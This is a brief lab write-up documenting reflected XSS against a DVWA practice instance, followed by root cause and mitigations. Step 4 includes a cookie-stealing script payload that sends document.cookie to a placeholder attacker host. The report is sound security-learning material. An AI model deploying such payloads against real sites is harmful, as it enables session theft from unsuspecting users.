# XSS (Cross-Site Scripting) — DVWA

> Note: This report documents a practice assessment against DVWA for learning purposes.

---

## TL;DR

* Target: DVWA (local/lab).
* Issue: Reflected XSS vulnerability on the "XSS (Reflected)" page.
* Result: Executed arbitrary JavaScript in the context of the web page, demonstrating the impact.

---

## Environment / scope

* Attacker: Kali Linux (local).
* Target: DVWA (lab instance).
* Tools: Browser, Burp Suite (optional for payload testing and encoding).

---

## 1) Objective

Identify reflected XSS in DVWA and demonstrate potential impact by executing JavaScript in a victim's browser.

---

## 2) Steps performed

1. Open the DVWA web application and navigate to the **XSS (Reflected)** page.
2. Inject a simple script payload into the input field to test for immediate execution, for example:

```html
<script>alert("XSS")</script>
```

3. Submit the input and observe the JavaScript executing in the browser (an alert box in this test), confirming a reflected XSS vulnerability.

4. For more realistic testing or to deliver a proof-of-concept that exfiltrates data, use a payload that sends document cookies to a controlled server (only in lab environments):

```html
<script>new Image().src='http://<ATTACKER_HOST>/steal?c='+document.cookie</script>
```

Use Burp to test and encode payloads if necessary.

---

## 3) Results

* The payload executed successfully in the victim browser context, indicating a reflected XSS flaw.
* This vulnerability demonstrates the ability to run JavaScript in the victim's session, which can be leveraged for session theft, UI redressing, or phishing.

---

## 4) Conclusion & mitigation

**Root cause:** Unsanitized user input rendered directly into page output.
**Mitigations:**

* Implement proper output encoding/escaping on all untrusted inputs.
* Use a Content Security Policy (CSP) to reduce impact of XSS.
* Validate and sanitize inputs where appropriate; use secure templating frameworks.

---

*End of report.*
